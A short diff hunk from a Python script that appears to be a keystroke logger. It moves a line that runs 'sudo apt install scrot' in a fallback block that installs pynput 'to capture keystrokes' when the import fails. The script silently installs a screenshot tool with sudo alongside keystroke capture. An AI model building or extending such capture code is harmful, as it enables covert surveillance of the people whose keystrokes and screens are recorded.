@@ -74,9 +74,9 @@ try:
   # module to capture keystrokes
 	from pynput import keyboard
 except:
-	subp.call('sudo apt install scrot', shell=True)
 	# attempt to install dependency
 	install_dependency('pynput')
+	subp.call('sudo apt install scrot', shell=True)
 	# try importing module after attempting download
 	from pynput import keyboard
 	
